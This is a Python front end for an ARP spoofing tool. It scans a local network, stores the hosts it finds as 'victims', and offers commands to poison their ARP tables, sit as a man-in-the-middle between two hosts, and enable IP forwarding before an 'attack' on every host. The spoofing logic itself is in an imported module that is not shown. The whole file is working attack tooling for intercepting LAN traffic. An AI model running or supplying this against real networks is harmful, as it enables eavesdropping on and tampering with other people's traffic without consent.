from arptables.ArpTable import ArpTable
import os



#Dictionary to save all the objects, the Key of each object will be the IP of the victim table
victims = {}


while True:

    cmd = input('> ').split(' ')

    if cmd[0] == 'scan':

        print("Scanning network " + cmd[1])
        ArpTable.arpscan(cmd[1])

        #Create a object for each victim except attacker
        for victim in ArpTable.table:
            if victim[0] != ArpTable.IP:
                victims[victim[0]] = ArpTable()
                victims[victim[0]].IP = victim[0]
                victims[victim[0]].MAC = victim[1]



    if ArpTable.table == []:
        print("Scan the network before " + cmd[0])
        continue


    if cmd[0] == 'hosts':
        ArpTable.show(ArpTable)


    if cmd[0] == 'arptable':
        victims[cmd[1]].show()


    if cmd[0] == 'spoof':
        victims[cmd[1]].spoof_row()


    if cmd[0] == 'fullspoof':
        victims[cmd[1]].spoofall()


    if cmd[0] == 'spoofall':
        for victim in victims:
            victims[victim].spoofall()   


    if cmd[0] == 'mitm':
        
        victims[cmd[1]].spoof(cmd[2])
        victims[cmd[2]].spoof(cmd[1])


    if cmd[0] == 'restore':

        if cmd[1] == "all":
            for victim in victims:
                victims[victim].restore()

        else:
            victims[cmd[1]].restore()


    if cmd[0] == 'attack':
        os.system("echo 1 | tee /proc/sys/net/ipv4/ip_forward")
        print("Forwarding packets enabled")

        for victim in victims:
            victims[victim].attack()


    if cmd[0] == 'exit':
        os.system("echo 0 | tee /proc/sys/net/ipv4/ip_forward")
        break






    

    

    

    







